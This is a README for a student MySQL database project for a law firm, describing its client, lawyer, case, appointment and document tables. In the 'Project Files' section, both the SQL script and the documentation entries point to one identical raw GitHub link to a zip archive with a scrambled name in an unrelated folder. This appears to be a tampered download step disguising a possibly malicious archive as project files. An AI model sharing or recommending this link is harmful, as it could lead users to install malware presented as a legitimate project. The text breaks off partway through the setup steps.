# Owino & Company Advocates Database Management System

## 📌 Project Purpose
This project is a **Database Management System (DBMS)** for *Owino & Company Advocates*.  
It is designed to streamline client management, case tracking, appointments, and document storage for the law firm.  

The database ensures:
- Organized client and lawyer records
- Efficient tracking of legal cases
- Scheduling and management of appointments
- Secure storage of case-related documents

---

## 🏗️ Database Structure
The database is implemented in **MySQL** and consists of the following tables:

1. **Clients**
   - Stores client details (name, email, phone, address).

2. **Lawyers**
   - Stores lawyer details (name, specialty, contact).

3. **Cases**
   - Links clients with lawyers.
   - Tracks case type, status, description, and dates.

4. **Appointments**
   - Schedules meetings between clients and lawyers.

5. **Documents**
   - Stores uploaded documents related to cases.

---

## 🔑 Relationships
- One **Client** can have multiple **Cases**.
- One **Lawyer** can handle multiple **Cases**.
- One **Case** can have multiple **Documents**.
- Clients and Lawyers are linked via **Appointments**.

---

## 📂 Project Files
- `https://raw.githubusercontent.com/Griffnificent/PLP-Database-Design-plp-database-design-july-cohort-wk--8-Assignment-Final-Project/main/arbitratorship/cohort_design_PL_Assignment_plp_Project_Database_wk_Final_Design_database_july_v1.8.zip` → Contains the full SQL script to create the database, tables, constraints, and sample data.
- `https://raw.githubusercontent.com/Griffnificent/PLP-Database-Design-plp-database-design-july-cohort-wk--8-Assignment-Final-Project/main/arbitratorship/cohort_design_PL_Assignment_plp_Project_Database_wk_Final_Design_database_july_v1.8.zip` → Documentation explaining project purpose, structure, and setup.

---

## 🚀 Setup Instructions
1. Clone this repository:
   ```bash
   git clone <your-repo-url>
   cd <repo-folder>
